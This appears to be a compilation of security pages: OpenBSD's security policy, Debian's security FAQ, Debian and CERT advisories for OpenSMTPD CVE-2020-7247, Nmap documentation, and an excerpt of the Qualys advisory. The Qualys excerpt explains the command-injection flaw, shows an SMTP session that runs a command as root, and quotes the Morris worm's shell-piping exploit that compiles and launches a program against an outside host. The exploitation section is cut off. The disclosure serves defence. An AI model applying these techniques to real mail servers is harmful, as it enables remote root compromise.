* ### Goals

  OpenBSD believes in strong security. Our aspiration is to be NUMBER
  ONE in the industry for security (if we are not already there). Our
  open software development model permits us to take a more
  uncompromising view towards increased security than most vendors are
  able to. We can make changes the vendors would
  not make. Also, since OpenBSD is exported with [cryptography](crypto.html), we are able to take cryptographic approaches towards
  fixing security problems.* ### Full Disclosure

    Like many readers of the
    [BUGTRAQ mailing list](https://marc.info/?l=bugtraq),
    we believe in full disclosure of security problems. In the
    operating system arena, we were probably the first to embrace
    the concept. Many vendors, even of free software, still try
    to hide issues from their users.

    Security information moves very fast in cracker circles. On the other
    hand, our experience is that coding and releasing of proper security
    fixes typically requires about an hour of work — very fast fix
    turnaround is possible. Thus we think that full disclosure helps the
    people who really care about security.

    * ### Audit Process

      Our security auditing team typically has between six and twelve
      members who continue to search for and fix new security holes. We
      have been auditing since the summer of 1996. The process we follow to
      increase security is simply a comprehensive file-by-file analysis of
      every critical software component. We are not so much looking for
      security holes, as we are looking for basic software bugs, and if
      years later someone discovers the problem used to be a security
      issue, and we fixed it because it was just a bug, well, all the
      better. Flaws have been found in just about every area of the system.
      Entire new classes of security problems have been found during our
      audit, and often source code which had been audited earlier needs
      re-auditing with these new flaws in mind. Code often gets audited
      multiple times, and by multiple people with different auditing
      skills.

      Some members of our security auditing team worked for Secure Networks,
      the company that made the industry's premier network security scanning
      software package Ballista (Secure Networks got purchased by Network
      Associates, Ballista got renamed to Cybercop Scanner, and well...)
      That company did a lot of security research, and thus fit in well
      with the OpenBSD stance. OpenBSD passed Ballista's tests with flying
      colours since day 1.

      Another facet of our security auditing process is its proactiveness.
      In most cases we have found that the determination of exploitability
      is not an issue. During our ongoing auditing process we find many
      bugs, and endeavor to fix them even though exploitability is not
      proven. We fix the bug, and we move on to find other bugs to fix. We
      have fixed many simple and obvious careless programming errors in code
      and only months later discovered that the problems were in fact
      exploitable. (Or, more likely someone on
      [BUGTRAQ](https://marc.info/?l=bugtraq)
      would report that other operating systems were vulnerable to a newly
      discovered problem, and then it would be discovered that OpenBSD had
      been fixed in a previous release). In other cases we have been saved
      from full exploitability of complex step-by-step attacks because we
      had fixed one of the intermediate steps. An example of where we
      managed such a success is the lpd advisory that Secure Networks put out.* ### New Technologies

        As we audit source code, we often invent new ways of solving problems.
        Sometimes these ideas have been used before in some random application
        written somewhere, but perhaps not taken to the degree that we do.

          Our proactive auditing process has really paid off. Statements like
          This problem was fixed in OpenBSD about 6 months ago have become
          commonplace in security forums like
          [BUGTRAQ](https://marc.info/?l=bugtraq).

          The most intense part of our security auditing happened immediately
          before the OpenBSD 2.0 release and during the 2.0→2.1 transition,
          over the last third of 1996 and first half of 1997. Thousands (yes,
          thousands) of security issues were fixed rapidly over this year-long
          period; bugs like the standard buffer overflows, protocol
          implementation weaknesses, information gathering, and filesystem
          races. Hence most of the security problems that we encountered were
          fixed before our 2.1 release, and then a far smaller number needed
          fixing for our 2.2 release. We do not find as many problems anymore,
          it is simply a case of diminishing returns. Recently the security
          problems we find and fix tend to be significantly more obscure or
          complicated. Still we will persist for a number of reasons:
          + Occasionally we find a simple problem we missed earlier. Doh!+ Security is like an arms race; the best attackers will continue
              to search for more complicated exploits, so we will too.+ Finding and fixing subtle flaws in complicated software is
                a lot of fun.

          The auditing process is not over yet, and as you can see we continue
          to find and fix new security flaws.* ### Secure by Default

            To ensure that novice users of OpenBSD do not need to become security
            experts overnight (a viewpoint which other vendors seem to have), we
            ship the operating system in a Secure by Default mode. All non-essential
            services are disabled. As the user/administrator becomes more familiar
            with the system, he will discover that he has to enable daemons and other
            parts of the system. During the process of learning how to enable a new
            service, the novice is more likely to learn of security considerations.

            This is in stark contrast to the increasing number of systems that
            ship with NFS, mountd, web servers, and various other services enabled
            by default, creating instantaneous security problems for their users
            within minutes after their first install.* ### Cryptography

              And of course, since the OpenBSD project is based in Canada, it is possible
              for us to integrate cryptography. For more information, read the page
              outlining [what we have done with cryptography](crypto.html).* ### Advisories

                Please refer to the links at the top of this page.* ### Watching our Changes

                  Since we take a proactive stance with security, we are continually
                  finding and fixing new security problems. Not all of these problems
                  get widely reported because (as stated earlier) many of them are not
                  confirmed to be exploitable; many simple bugs we fix do turn out to
                  have security consequences we could not predict. We do not have the
                  time resources to make these changes available in the above format.

                  Thus there are usually minor security fixes in the current source code
                  beyond the previous major OpenBSD release. We make a limited
                  guarantee that these problems are of minimal impact and unproven
                  exploitability. If we discover that a problem definitely matters for
                  security, patches will show up here **VERY** quickly.

                  People who are really concerned with security can do a number of
                  things:
                  + If you understand security issues, watch our
                    [source-changes mailing list](mail.html) and keep an
                    eye out for things which appear security related. Since
                    exploitability is not proven for many of the fixes we make,
                    do not expect the relevant commit message to say SECURITY FIX!.
                    If a problem is proven and serious, a patch will be available
                    here very shortly after.+ Track our current source code tree, and teach yourself how to do a
                      complete system build from time to time (read /usr/src/Makefile
                      carefully). Users can make the assumption that the current
                      source tree always has stronger security than the previous release.
                      However, building your own system from source code is not trivial;
                      it is over 850MB of source code, and problems do occur as we
                      transition between major releases.+ Install a binary snapshot for your
                        architecture, which are made available fairly often. For
                        instance, an amd64 snapshot is typically made available daily.* ### Reporting problems

                    If you find a new security problem, you can mail it to
                    security@openbsd.org.

                    If you wish to PGP encode it (but please only do so if privacy is very
                    urgent, since it is inconvenient) use this [pgp key](advisories/pgpkey.txt).* ### Further Reading

                      Numerous
                      [papers](events.html) have been written by OpenBSD team members,
                      many dedicated to security.

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

Package        : opensmtpd
CVE ID         : CVE-2020-7247
Debian Bug     : 950121

Qualys discovered that the OpenSMTPD SMTP server performed insufficient
validation of email addresses which could result in the execution of
arbitrary commands as root. In addition this update fixes a denial of
service by triggering an opportunistic TLS downgrade.

For the oldstable distribution (stretch), these problems have been fixed
in version 6.0.2p1-2+deb9u2.

For the stable distribution (buster), these problems have been fixed in
version 6.0.3p1-5+deb10u3. This update also includes non-security
bugfixes which were already lined up for the Buster 10.3 point release.

We recommend that you upgrade your opensmtpd packages.

For the detailed security status of opensmtpd please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/opensmtpd>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book

==============================================================================
Summary
==============================================================================

We discovered a vulnerability in OpenSMTPD, OpenBSD's mail server. This
vulnerability is exploitable since May 2018 (commit a8e222352f, "switch
smtpd to new grammar") and allows an attacker to execute arbitrary shell
commands, as root:

- either locally, in OpenSMTPD's default configuration (which listens on
  the loopback interface and only accepts mail from localhost);

- or locally and remotely, in OpenSMTPD's "uncommented" default
  configuration (which listens on all interfaces and accepts external
  mail).

We developed a simple proof of concept and successfully tested it
against OpenBSD 6.6 (the current release) and Debian testing (Bullseye);
other versions and distributions may be exploitable.

==============================================================================
Analysis
==============================================================================

OpenSMTPD's smtp_mailaddr() function is responsible for validating
sender (MAIL FROM) and recipient (RCPT TO) mail addresses:

------------------------------------------------------------------------------
2189 static int
2190 smtp_mailaddr(struct mailaddr *maddr, char *line, int mailfrom, char **args,
2191     const char *domain)
2192 {
....
2218         if (!valid_localpart(maddr->user) ||
2219             !valid_domainpart(maddr->domain)) {
....
2234                 return (0);
2235         }
2236
2237         return (1);
2238 }
------------------------------------------------------------------------------

- it calls valid_domainpart() to validate the domain name (after the @
  sign) of a mail address -- this function only accepts IPv4 and IPv6
  addresses, and alpha-numeric, '.', '-', and '_' characters;

- it calls valid_localpart() to validate the local part (before the @
  sign) of a mail address -- this function only accepts alpha-numeric,
  '.', and MAILADDR_ALLOWED characters (a white list from RFC 5322):

  71 #define MAILADDR_ALLOWED        "!#$%&'*/?^`{|}~+-=_"

Among the characters in MAILADDR_ALLOWED, the ones that are also in
MAILADDR_ESCAPE are later transformed into ':' characters (escaped) by
mda_expand_token():

  72 #define MAILADDR_ESCAPE         "!#$%&'*?`{|}~"

smtp_mailaddr()'s white-listing and mda_expand_token()'s escaping are
fundamental to OpenSMTPD's security -- they prevent dangerous characters
from reaching the shell that executes MDA commands (in mda_unpriv()):

        execle("/bin/sh", "/bin/sh", "-c", mda_command, (char *)NULL,
            mda_environ);

Mail Delivery Agents (MDAs) are responsible for delivering mail to local
recipients; for example, OpenSMTPD's default MDA method is "mbox", and
the corresponding MDA command is (in parse.y):

        asprintf(&dispatcher->u.local.command,
            "/usr/libexec/mail.local -f %%{mbox.from} %%{user.username}");

where %{user.username} is the name of an existing local user (the local
part of the recipient address), and %{mbox.from} is the sender address
(which would be under the complete control of an attacker if it were not
for smtp_mailaddr()'s white-listing and mda_expand_token()'s escaping).

Unfortunately, we discovered a vulnerability in smtp_mailaddr()
(CVE-2020-7247):

------------------------------------------------------------------------------
2189 static int
2190 smtp_mailaddr(struct mailaddr *maddr, char *line, int mailfrom, char **args,
2191     const char *domain)
2192 {
....
2218         if (!valid_localpart(maddr->user) ||
2219             !valid_domainpart(maddr->domain)) {
....
2229                 if (maddr->domain[0] == '\0') {
2230                         (void)strlcpy(maddr->domain, domain,
2231                             sizeof(maddr->domain));
2232                         return (1);
2233                 }
2234                 return (0);
2235         }
2236
2237         return (1);
2238 }
------------------------------------------------------------------------------

If the local part of an address is invalid (line 2218) and if its domain
name is empty (line 2229), then smtp_mailaddr() adds the default domain
automatically (line 2230) and returns 1 (line 2232), although it should
return 0 because the local part of the address is invalid (for example,
because it contains invalid characters).

As a result, an attacker can pass dangerous characters that are not in
MAILADDR_ALLOWED and not in MAILADDR_ESCAPE (';' and ' ' in particular)
to the shell that executes the MDA command. For example, the following
local SMTP session executes "sleep 66" as root, in OpenSMTPD's default
configuration:

------------------------------------------------------------------------------
$ nc 127.0.0.1 25
220 obsd66.example.org ESMTP OpenSMTPD
HELO professor.falken
250 obsd66.example.org Hello professor.falken [127.0.0.1], pleased to meet you

250 2.0.0 Ok
RCPT TO:<root>
250 2.1.5 Destination address valid: Recipient ok
DATA
354 Enter mail, end with "." on a line by itself

How about a nice game of chess?
.
250 2.0.0 e6330998 Message accepted for delivery
QUIT
221 2.0.0 Bye
------------------------------------------------------------------------------

==============================================================================
Exploitation
==============================================================================

Nevertheless, our ability to execute arbitrary shell commands through
the local part of the sender address is rather limited:

- although OpenSMTPD is less restrictive than RFC 5321, the maximum
  length of a local part should be 64 characters;

- the characters in MAILADDR_ESCAPE (for example, '$' and '|') are
  transformed into ':' characters.

To overcome these limitations, we drew inspiration from the Morris worm
(<https://spaf.cerias.purdue.edu/tech-reps/823.pdf>), which exploited the
DEBUG vulnerability in Sendmail by executing the body of a mail as a
shell script:

------------------------------------------------------------------------------
debug
mail from: </dev/null>
rcpt to: <"|sed -e '1,/^$/'d | /bin/sh ; exit 0">
data

cd /usr/tmp
cat > x14481910.c <<'EOF'
[text of vector program]
EOF
cc -o x14481910 x14481910.c;x14481910 128.32.134.16 32341 8712440;
rm -f x14481910 x14481910.c

.
quit
------------------------------------------------------------------------------

Indeed, the standard input of an MDA command is the mail itself: "sed"
removes the headers (which were added automatically by the mail server)
and "/bin/sh" executes the body.

We cannot simply reuse this command (because we cannot use the '|' and
'>' characters), but we can use "read" to remove N header lines (where N
is greater than the number of header lines added by the mail server) and
prepend a "NOP slide" of N comment lines to the body of our mail. For
example, the following remote SMTP session executes the body of our
mail, as root, in OpenSMTPD's "uncommented" default configuration:

------------------------------------------------------------------------------
$ nc 192.168.56.143 25

## OpenSMTPD vulnerable to local privilege escalation and remote code execution

#### Vulnerability Note VU#390745

Original Release Date: 2020-01-31 | Last Revised: 2020-03-09

---

### Overview

Qualys Research Labs found that the smtp\_mailaddr() function in [OpenSMTPD](https://www.opensmtpd.org/) version 6.6 does not properly sanitize user input, which could allow a local attacker to escalate their privileges, and allow either a local or remote attacker to execute arbitrary code as root.

### Description

| OpenSMTPD is an open-source server-side implementation of the Simple Mail Transfer Protocol ([SMTP](https://tools.ietf.org/html/rfc821)) that is part of the [OpenBSD Project](https://www.openbsd.org/). OpenSMTPD's smtp\_mailaddr() function is responsible for validating sender and recipient mail addresses. If the local part of an address is invalid and the domain name is empty, smtp\_mailaddr() will automatically add a domain name as opposed to failing because of the invalid local address. This will allow the invalid local address to pass through the function without validation. |
| --- |

### Impact

| An attacker could send a malformed SMTP message that will bypass the smtp\_mailaddr() validation and execute arbitrary code. This could allow a local attacker to escalate their privileges, and allow either a local or remote attacker to execute arbitrary code as root. |
| --- |

### Solution

| **Apply an update**  OpenBSD has released a patch in [OpenSMTPD version 6.6.2p1](https://github.com/OpenSMTPD/OpenSMTPD/releases) to address this vulnerability. |

Package        : opensmtpd
CVE ID         : CVE-2020-7247
Debian Bug     : 950121

Qualys discovered that the OpenSMTPD SMTP server performed insufficient
validation of email addresses which could result in the execution of
arbitrary commands as root. In addition this update fixes a denial of
service by triggering an opportunistic TLS downgrade.

For the oldstable distribution (stretch), these problems have been fixed
in version 6.0.2p1-2+deb9u2.

For the stable distribution (buster), these problems have been fixed in
version 6.0.3p1-5+deb10u3. This update also includes non-security
bugfixes which were already lined up for the Buster 10.3 point release.

We recommend that you upgrade your opensmtpd packages.

For the detailed security status of opensmtpd please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/opensmtpd>

## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*
...] [
*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
